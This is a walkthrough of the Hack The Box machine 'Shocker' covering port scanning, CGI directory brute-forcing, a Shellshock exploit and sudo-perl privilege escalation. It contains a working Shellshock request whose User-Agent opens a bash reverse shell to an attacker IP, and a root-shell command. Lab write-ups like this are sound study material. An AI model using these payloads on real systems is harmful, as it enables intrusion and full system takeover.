# Shocker HTB writeup

<!---
summary
-->
----------------------------------------------------------------------------------------------------------------------------------------------------
 # Nmap
Nmap scan shows that TCP port 80 (http) and 2222 (ssh) are open.
```
Nmap scan report for 10.129.171.244
Host is up, received user-set (0.064s latency).
Scanned at 2025-06-24 16:43:20 BST for 19s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X (92%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 3.11 - 4.9 (92%), Linux 3.2 - 3.8 (86%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=6/24%OT=80%CT=1%CU=%PV=Y%DS=2%DC=T%G=N%TM=685AC7AB%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10C%TI=Z%II=I%TS=8)
SEQ(SP=FD%GCD=1%ISR=10B%TI=Z%TS=8)
OPS(O1=M552ST11NW6%O2=M552ST11NW6%O3=M552NNT11NW6%O4=M552ST11NW6%O5=M552ST11NW6%O6=M552ST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%TG=40%W=7210%O=M552NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=N)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.002 days (since Tue Jun 24 16:41:18 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   99.36 ms 10.10.14.1
2   99.78 ms 10.129.171.244

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 24 16:43:39 2025 -- 1 IP address (1 host up) scanned in 19.91 seconds
```
----------------------------------------------------------------------------------------------------------------------------------------------------
# TCP 80 - HTTP
It is a simple website, nothing too suspicious on the home page.
![image](https://github.com/user-attachments/assets/7963425f-a96b-4a4e-a233-0f925077df09)

# Directory Brute Force
```
┌──(kali㉿kali)-[~/…/shocker/results/10.129.171.244/scans]
└─$ feroxbuster -u http://10.129.171.244 -f -n --dont-filter -C 404 
                                                                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.171.244
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🤪  Filter Wildcards      │ false
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w      297c http://10.129.171.244/cgi-bin/
200      GET      234l      773w    66161c http://10.129.171.244/bug.jpg
200      GET        9l       13w      137c http://10.129.171.244/
403      GET       11l       32w      295c http://10.129.171.244/icons/
403      GET       11l       32w      303c http://10.129.171.244/server-status/
[####################] - 11s    30001/30001   0s      found:5       errors:0      
[####################] - 11s    30000/30000   2684/s  http://10.129.171.244/  
```

We brute force again on the ```/cgi-bin``` directory with extensions of common script types. There is a script ```user.sh``` on the server.

```
┌──(kali㉿kali)-[~/…/shocker/results/10.129.171.244/scans]
└─$ feroxbuster -u http://10.129.171.244/cgi-bin -f -n --dont-filter -C 404 -x sh,cgi,pl
                                                                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.171.244/cgi-bin
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [sh, cgi, pl]
 🏁  HTTP methods          │ [GET]
 🤪  Filter Wildcards      │ false
 🪓  Add Slash             │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      234l      773w    66161c http://10.129.171.244/bug.jpg
200      GET        9l       13w      137c http://10.129.171.244/
200      GET        7l       18w      119c http://10.129.171.244/cgi-bin/user.sh
[####################] - 49s   120004/120004  0s      found:3       errors:19     
[####################] - 48s   120000/120000  2483/s  http://10.129.171.244/cgi-bin/ 
```

# user.sh
![image](https://github.com/user-attachments/assets/13133352-d02f-49c9-ab7a-4a29ffd914e6)
----------------------------------------------------------------------------------------------------------------------------------------------------
# Shell as shelly

As the name of the box suggests, ShellShock (CVE-2014-6271) is very likely to be the foothold that helps us gain initial access.
This [article](https://www.invicti.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/) might be helpful for those who are not familiar with it.

We will start a listener on our kali machine on tcp 9001, and send the following request.
```
GET /cgi-bin/user.sh HTTP/1.1

Host: 10.129.171.244

User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.73/9001 0>&1

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Priority: u=0, i
```
We successfully obtained a shell as Shelly
![image](https://github.com/user-attachments/assets/98446511-15be-4a40-a43d-8e87ed98ebe6)

And we found the ```user.txt``` under shelly's home directory
```
shelly@Shocker:/usr/lib/cgi-bin$ whoami
shelly
shelly@Shocker:/usr/lib/cgi-bin$ cd ~
shelly@Shocker:/home/shelly$ ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
e36901b4***
shelly@Shocker:/home/shelly$ 
```
----------------------------------------------------------------------------------------------------------------------------------------------------
# Shell as root
```
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
Upon checking [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo), we can gain privilege esculation by the following command.
![image](https://github.com/user-attachments/assets/98ce8d18-dd0c-4f0e-94ce-987003315df6)
```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
# whoami
root
# cat /root/root.txt
59264f***
```



